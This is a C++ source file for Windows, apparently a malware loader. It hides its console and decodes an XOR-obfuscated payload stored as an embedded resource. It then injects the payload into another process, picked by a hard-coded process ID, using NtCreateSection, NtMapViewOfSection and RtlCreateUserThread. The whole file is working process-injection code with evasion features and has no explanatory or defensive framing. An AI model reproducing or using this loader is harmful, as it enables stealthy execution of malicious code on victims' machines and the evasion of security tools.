#include <iostream>
#include <string>
#include <windows.h>
#include "resource.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


/* enums */
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;


/* structs */
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


/* functions */
typedef NTSTATUS(NTAPI* NT_CREATE_SECTION) (
	OUT PHANDLE SectionHandle,
	IN ULONG DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN PLARGE_INTEGER MaximumSize OPTIONAL,
	IN ULONG PageAttributess,
	IN ULONG SectionAttributes,
	IN HANDLE FileHandle OPTIONAL
	);
NT_CREATE_SECTION NtCreateSection;

typedef NTSTATUS(NTAPI* NT_MAP_VIEW_OF_SECTION) (
	IN HANDLE SectionHandle,
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress OPTIONAL,
	IN ULONG ZeroBits OPTIONAL,
	IN ULONG CommitSize,
	IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
	IN OUT PULONG ViewSize,
	IN SECTION_INHERIT InheritDisposition,
	IN ULONG AllocationType OPTIONAL,
	IN ULONG Protect
	);
NT_MAP_VIEW_OF_SECTION NtMapViewOfSection;

typedef NTSTATUS(NTAPI* NT_UNMAP_VIEW_OF_SECTION) (
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress
	);
NT_UNMAP_VIEW_OF_SECTION NtUnmapViewOfSection;

typedef NTSTATUS(NTAPI* NT_WRITE_VIRTUAL_MEMORY) (
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN ULONG NumberOfBytesToWrite,
	OUT PULONG NumberOfBytesWritten OPTIONAL
	);
NT_WRITE_VIRTUAL_MEMORY NtWriteVirtualMemory;

typedef NTSTATUS(NTAPI* NT_OPEN_PROCESS) (
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL
	);
NT_OPEN_PROCESS NtOpenProcess;

typedef NTSTATUS(NTAPI* RTL_CREATE_USER_THREAD) (
	IN HANDLE ProcessHandle,
	IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
	IN BOOLEAN CreateSuspended,
	IN ULONG StackZeroBits,
	IN OUT PULONG StackReserved,
	IN OUT PULONG StackCommit,
	IN PVOID StartAddress,
	IN PVOID StartParameter OPTIONAL,
	OUT PHANDLE ThreadHandle,
	OUT PCLIENT_ID ClientID
	);
RTL_CREATE_USER_THREAD RtlCreateUserThread;

typedef NTSTATUS(NTAPI* NT_WAIT_FOR_SINGLE_OBJECT) (
	IN HANDLE ObjectHandle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER TimeOut OPTIONAL
	);
NT_WAIT_FOR_SINGLE_OBJECT NtWaitForSingleObject;

typedef NTSTATUS(NTAPI* NT_CLOSE) (
	IN HANDLE ObjectHandle
	);
NT_CLOSE NtClose;

void checkNtStatus(const NTSTATUS status);
const std::string loadPayload();

int main(int argc, char** argv)
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

	HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
	if (ntdll == NULL)
	{
		exit(1);
	}
	NTSTATUS status;
	NtCreateSection = (NT_CREATE_SECTION)GetProcAddress(ntdll, "NtCreateSection");
	NtMapViewOfSection = (NT_MAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtMapViewOfSection");
	NtUnmapViewOfSection = (NT_UNMAP_VIEW_OF_SECTION)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	NtWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	NtOpenProcess = (NT_OPEN_PROCESS)GetProcAddress(ntdll, "NtOpenProcess");
	RtlCreateUserThread = (RTL_CREATE_USER_THREAD)GetProcAddress(ntdll, "RtlCreateUserThread");
	NtWaitForSingleObject = (NT_WAIT_FOR_SINGLE_OBJECT)GetProcAddress(ntdll, "NtWaitForSingleObject");
	NtClose = (NT_CLOSE)GetProcAddress(ntdll, "NtClose");

	const std::string payload = loadPayload();
	SIZE_T size = payload.size();
	LARGE_INTEGER sectionSize = { size };
	HANDLE currentProcess = GetCurrentProcess();
	HANDLE section = NULL;
	HANDLE targetProcess = NULL;
	HANDLE targetProcessThread = NULL;
	PVOID localSection = NULL, targetSection = NULL;

	status = NtCreateSection(&section, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	checkNtStatus(status);

	status = NtMapViewOfSection(section, currentProcess, &localSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_READWRITE);
	checkNtStatus(status);

	targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 7332);

	status = NtMapViewOfSection(section, targetProcess, &targetSection, NULL, NULL, NULL, (PULONG)&size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
	checkNtStatus(status);

	status = NtWriteVirtualMemory(currentProcess, localSection, (PVOID)payload.c_str(), size, NULL);
	checkNtStatus(status);

	status = RtlCreateUserThread(targetProcess, NULL, FALSE, 0, 0, 0, targetSection, NULL, &targetProcessThread, NULL);
	checkNtStatus(status);

	status =  NtWaitForSingleObject(targetProcessThread, FALSE, NULL);
	checkNtStatus(status);

	status = NtClose(targetProcessThread);
	checkNtStatus(status);
	status = NtUnmapViewOfSection(targetProcess, targetSection);
	checkNtStatus(status);
	status = NtClose(targetProcess);
	checkNtStatus(status);

	status = NtUnmapViewOfSection(currentProcess, localSection);
	checkNtStatus(status);
	status = NtClose(section);
	checkNtStatus(status);

	FreeLibrary(ntdll);

	return 0;
}

void checkNtStatus(NTSTATUS status)
{
	if (!NT_SUCCESS(status)) {
		printf("Failed in calling NtAllocateVirtualMemory(). Error code: 0x%16x\n", status);
		exit(1);
	}
}

const std::string loadPayload()
{
	HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDR_KEY1), L"key");
	DWORD keySize = SizeofResource(NULL, keyResource);
	HGLOBAL keyResourceHandle = LoadResource(NULL, keyResource);
	char* key = (char*)LockResource(keyResourceHandle);

	HRSRC obfuscatedPayloadResource = FindResource(NULL, MAKEINTRESOURCE(IDR_OBFUSCATEDPAYLOAD1), L"obfuscatedPayload");
	DWORD obfuscatedPayloadSize = SizeofResource(NULL, obfuscatedPayloadResource);
	HGLOBAL obfuscatedPayloadResourceHandle = LoadResource(NULL, obfuscatedPayloadResource);
	char* obfuscatedPayload = (char*)LockResource(obfuscatedPayloadResourceHandle);
	std::string payload = "";

	int keyIndex = 0;
	for (unsigned int i = 0; i < obfuscatedPayloadSize; i += 4)
	{
		std::string currentByte = std::string() + obfuscatedPayload[i] + obfuscatedPayload[i + 1] + obfuscatedPayload[i + 2] + obfuscatedPayload[i + 3];
		payload += stol(currentByte, nullptr, 0) ^ key[keyIndex++ % keySize];
	}

	FreeResource(keyResourceHandle);
	FreeResource(obfuscatedPayloadResource);

	return payload;
}
